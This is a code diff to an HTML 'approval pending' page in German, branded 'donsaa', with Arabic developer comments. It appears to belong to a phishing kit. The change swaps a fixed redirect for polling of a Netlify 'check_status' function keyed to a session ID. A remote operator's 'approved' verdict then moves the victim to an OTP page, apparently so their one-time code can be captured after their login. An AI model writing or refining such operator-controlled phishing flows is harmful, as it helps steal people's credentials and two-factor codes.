@@ -2,11 +2,11 @@
 <html lang="de">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sicherheitsprüfung läuft...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Genehmigung ausstehend...</title>
     <link rel="stylesheet" href="assets/css/style.css">
     <style>
-        /* أنماط مخصصة لهذه الصفحة */
+        /* الأنماط المدمجة ضرورية */
         body { justify-content: center; align-items: center; }
         .waiting-container { text-align: center; padding: 40px; }
         .logo-text { font-size: 38px; font-weight: bold; color: #000000; margin-bottom: 40px; display: block; }
@@ -19,20 +19,56 @@
 
     <div class="waiting-container">
         <span class="logo-text">donsaa</span>
-        
-        <p class="security-message">
-            Bitte warten Sie, während wir die Sicherheitsprüfung durchführen
-        </p>
-        
         <div class="spinner-large"></div>
-        
+        <div class="security-message">
+            Ihre Anforderung wird überprüft. Bitte warten Sie auf die Genehmigung...
+        </div>
     </div>
-
+    
     <script>
-        // التحويل إلى صفحة OTP بعد 30 ثانية
-        setTimeout(() => {
-            window.location.href = 'otp.html'; 
-        }, 30000); 
+        // ---------------------------------------------------------------
+        // منطق فحص حالة الجلسة (Polling)
+        // ---------------------------------------------------------------
+        document.addEventListener('DOMContentLoaded', function() {
+            // استخراج Session ID من رابط URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const sessionId = urlParams.get('id');
+
+            if (!sessionId) {
+                // إذا لم يكن هناك ID، نعود لصفحة الدخول
+                window.location.href = '/'; 
+                return;
+            }
+
+            const checkStatus = async () => {
+                try {
+                    // استدعاء دالة Netlify لفحص الحالة كل 3 ثواني
+                    const response = await fetch(`/.netlify/functions/check_status?id=${sessionId}`);
+                    const data = await response.json();
+                    const status = data.status;
+
+                    if (status === 'approved') {
+                        // الموافقة: التوجيه لصفحة OTP
+                        window.location.href = '/otp.html';
+                        clearInterval(pollInterval);
+                    } else if (status === 'rejected') {
+                        // الرفض: التوجيه لصفحة الدخول مجدداً
+                        window.location.href = '/'; 
+                        clearInterval(pollInterval);
+                    }
+                    // إذا كانت pending (قيد الانتظار)، نستمر في الفحص
+                    
+                } catch (error) {
+                    console.error("Error checking session status, retrying...", error);
+                }
+            };
+
+            // بدء الفحص كل 3 ثواني
+            const pollInterval = setInterval(checkStatus, 3000); 
+
+            // فحص فوري عند التحميل
+            checkStatus();
+        });
     </script>
 
 </body>
